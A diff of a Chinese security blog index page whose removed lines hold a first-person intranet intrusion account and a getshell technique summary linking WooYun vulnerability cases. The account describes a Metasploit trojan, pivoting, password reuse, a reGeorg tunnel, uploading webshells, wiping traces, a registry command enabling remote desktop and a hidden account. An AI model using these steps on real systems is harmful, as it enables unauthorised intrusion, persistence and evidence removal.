-<h3 id="0X03-横向渗透撸内网"><a href="#0X03-横向渗透撸内网" class="headerlink" title="0X03 横向渗透撸内网"></a>0X03 横向渗透撸内网</h3><p>发现目标主机有内网环境，个人比较喜欢用msf，于是生成了个msf木马上传执行获取到一个meterpretershell。这里需要注意的是生成木马时LHOST填你的服务器公网ip，设置msf监听时LHOST需要填你服务器的内网ip。<br><img src="https://i.imgur.com/0GEhpnI.png" alt=""><br><br><br>在meterpretershell里执行<code>run autoroute -s 10.1.1.0/24</code>添加路由扫内网445。发现一台内网机器存在ms_17_010但是session弹不回来，尴尬。<br><img src="https://i.imgur.com/U0HCe5B.png" alt=""><br><br><br>僵硬，变换思路在边界服务器上寻找有价值的可利用信息。最后发现了几个password.txt和一个批量更新密码的脚本，找到一个长得像管路员的密码。这里不得不说一下在内网渗透中信息收集的重要性，这个密码简直太给力了。<br><br><img src="https://i.imgur.com/TW3roh5.png" alt=""><br><br>因为是内网，所以得用代理工具把本机代理进去，这里我用的是reGeorg-master，上传tunnel.nosocket.php到网站目录下，配合Proxifier进行全局代理（Linux下用proxychains)。<br>用这个密码登录上了受害主机的ssh，ssh都拿到了，接下来把该删掉的东西都删掉。<br><br><br>扫描内网机器10.1.1.17发现开了ftp，用上面那个密码登录进去了，就是这么巧。然后ftp传马，先传了个大马。结果发现PHP版本太老了，然后上了个小马，菜刀连接。直接system权限。<img src="https://i.imgur.com/ajuB0PU.png" alt=""><br><br><img src="https://i.imgur.com/ceXEcXE.png" alt=""><br>发现没开3389，使用命令<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code>一键开启远程桌面。建立隐藏账户，成功连入远程桌面。<img src="https://i.imgur.com/dMHWkUQ.jpg" alt=""></p>
-<h3 id="0X04写在后面的话"><a href="#0X04写在后面的话" class="headerlink" title="0X04写在后面的话"></a>0X04写在后面的话</h3><p>第一次从外网渗透到内网，盯了三天终于撸下一台，感觉这个内网还有的撸，有时间在继续搞。</p>
-
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前一直没搞过内网渗透实战，了解的相关知识仅停留在理论层次，最近搞了一波，写个笔记记录一下。<br>
+        
+          <a class="article-more-a" href="/2018/09/06/记一次渗透测试实战/#more">more >></a>
+        
       
 
       
@@ -609,6 +875,21 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">实战</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">内网</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -658,26 +939,35 @@
         <a href="/2018/08/21/getshell总结/" class="archive-article-date">
   	<time datetime="2018-08-21T04:04:53.792Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-21</time>
 </a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">951字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">3分</span>
+      </span>
+    </span>
+</div>
+          
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在上一篇文章中，我总结了后渗透阶段的权限维持方法。那么我们该如何撕破口子getshell了。主要有三个方面：web层、中间件层、主机层。正好自己一直在看乌云漏洞库，案例也收藏了一大堆。本文将结合众多案例进行总结分析。像乌云老前辈致敬。<br><br>首先给大家推荐两个乌云镜像站。<br><br>带知识库的：<a href="http://wooyun.jozxing.cc" target="_blank" rel="noopener">http://wooyun.jozxing.cc</a><br><br>方便检索的：<a href="https://bugs.shuimugan.com" target="_blank" rel="noopener">https://bugs.shuimugan.com</a></p>
-<h2 id="web层"><a href="#web层" class="headerlink" title="web层"></a>web层</h2><p>web层能够导致getshell有很多类型；最常见的有文件上传、命令执行、注入、包含等，<br></p>
-<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。很多web系统都有上传点,运气好的话直接就是任意文件上传。比较多的还是结合解析漏洞各种fuzz绕过。<br><br>案例：<br><a href="https://bugs.shuimugan.com/bug/view?bug_no=181611" title="绕过360主机卫士文件上传防护" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=181611</a><br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=98908" title="中兴某站奇葩文件上传绕过GetShell" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=98908</a></p>
-<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>命令执行漏洞是指当应用程序在用到一些执行系统命令的函数时，如果用户能够控制命令执行函数中的参数，就会造成命令执行攻击。当然这里出现最多的还是一些框架的漏洞。<br><br>案例：<br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=209856" title="新浪微博docker remote API未授权访问导致远程命令执行(root)" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=209856</a><br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=205389" title="优酷主站存在远程命令执行漏洞" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=205389</a></p>
-<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>注入漏洞是由于字符过滤不严所造成的。当我们拿到一个注入点后。常规一点的思路是注出管理员账号密码进后台在权限较大的情况下可以直接写shell。<br>如果既注不出账号密码有写不了shell，该怎么办了，或许可以试一试用sqlmap读取数据库配置文件，运气好的话没准就连上去了，直接在数据库里写shell岂不美滋滋。<br><br>案例:<br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=172891" title="华三某系统另外一处sql注入导致GETSHELL" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=172891</a><br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=115828" title="云视某处SQL注入导致后台getshell" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=115828</a></p>
-<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含就是在一个文件里包含另一个文件，攻击者可以利用包含恶意文件达到getshell的母的。<br><br>案例：<br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=105542" title="方正证券某站文件包含漏洞" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=105542</a><br><br><a href="http://www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-复现分析/" title="phpmyadmin-4.8.1-复现分析" target="_blank" rel="noopener">http://www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-复现分析/</a></p>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还有很多姿势，如配置文件泄露、未授权访问、ssrf、各种组合拳等都可导致getshell。<br><br>案例：<br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=213982" title="bilibili某分站从信息泄露到ssrf再到命令执行" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=213982</a><br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=211100" title="从bin.rar到京华时报内网" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=211100</a></p>
-<h2 id="中间件层"><a href="#中间件层" class="headerlink" title="中间件层"></a>中间件层</h2><p>常见的中间件有Apache、tomcat、Nginx、jboss、weblogic、IIS等等。中间件漏洞在内网渗透中尤为重要。</p>
-<h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p>低版本的IIS存在严重的漏洞，不仅存在解析漏洞，还能利用HTTP PUT方法直接写shell。当IIS6.0 开启了WebDav协议时还存在缓冲区溢出会导致远程命令执行。<br><br>案例：<br><br><a href="https://www.cnblogs.com/tdcqma/p/6125789.html" title="IIS写权限漏洞（HTTP PUT方法利用）" target="_blank" rel="noopener">https://www.cnblogs.com/tdcqma/p/6125789.html</a><br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=197225" title="当当网某重要站点存在IISPUT（已成为跑马场）" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=197225</a></p>
-<h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>搜索<strong>tomcat漏洞</strong>一堆，不解释了,主要是弱口令和版本过低。<br><img src="https://i.imgur.com/CqZMVPr.png" alt=""><br><br><br><br><br>案例：<br><br><a href="http://www.freebuf.com/column/161349.html" title="Apache Tomcat远程命令执行漏洞(CVE-2017-12615) 漏洞利用到入侵检测" target="_blank" rel="noopener">http://www.freebuf.com/column/161349.html</a><br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=166393" title="58同城员工私搭Tomcat被Getshell影响内网安全" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=166393</a></p>
-<h3 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h3><p>JBoss这是一个基于JavaEE的应用服务器，与tomcat类似的是jboss也有远程部署平台，但不需要登陆。<br><br><a href="https://blog.csdn.net/u011215939/article/details/79141624" title="Jboss漏洞利用" target="_blank" rel="noopener">https://blog.csdn.net/u011215939/article/details/79141624</a><br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=163578" title="北京康仁堂药业有限公司某系统java反序列化命令执行(JBOSS，涉及内网)" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=163578</a></p>
-<h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>weblogic是一个基于JavaEE构架的中间件，安装完weblogic默认会监听7001端口，可以用来远程部署网站代码。<br><br>案例：<br><br><a href="http://www.freebuf.com/vuls/169420.html" title="WebLogic反序列化漏洞CVE-2018-2628复现与EXP构造" target="_blank" rel="noopener">http://www.freebuf.com/vuls/169420.html</a><br><br><a href="https://bugs.shuimugan.com/bug/view?bug_no=191149" title="中国联通多台重要服务器Weblogic反序列化漏洞(已Getshell)" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=191149</a></p>
-<h2 id="主机层"><a href="#主机层" class="headerlink" title="主机层"></a>主机层</h2><p>主机层面的漏洞主要用于提权和内网渗透。<br>推荐Aerfa师傅写的一篇文章*安全运维那些洞**<br><br><a href="https://pan.baidu.com/s/1mQovaJpdLR-ExZDPqJ28zg" title="安全运维那些洞" target="_blank" rel="noopener">https://pan.baidu.com/s/1mQovaJpdLR-ExZDPqJ28zg 密码: 617s</a></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>更多的getshell的姿势等待各位大佬自己去发掘，wooyun里面有很多不错的案例。<br><br>不足之处欢迎各位大佬评论指出。</p>
-
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在上一篇文章中，我总结了后渗透阶段的权限维持方法。那么我们该如何撕破口子getshell了。主要有三个方面：web层、中间件层、主机层。正好自己一直在看乌云漏洞库，案例也收藏了一大堆。本文将结合众多案例进行总结分析。像乌云老前辈致敬。<br>
+        
+          <a class="article-more-a" href="/2018/08/21/getshell总结/#more">more >></a>
+        
       
 
       
@@ -685,6 +975,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">总结</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -810,6 +1111,30 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">总结</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">实战</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
